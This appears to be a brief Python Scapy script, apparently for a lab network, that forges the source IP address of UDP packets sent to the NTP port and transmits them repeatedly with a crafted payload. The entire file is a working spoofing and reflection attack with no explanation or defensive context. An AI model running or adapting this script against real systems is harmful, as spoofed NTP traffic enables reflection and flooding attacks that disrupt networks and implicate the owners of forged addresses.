from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
E= "\x1b\x00\x02\x2a" * 12

spoofed_packet = IP(src=A, dst=B) / UDP(sport=48769, dport=123) / E
send(spoofed_packet, count=10)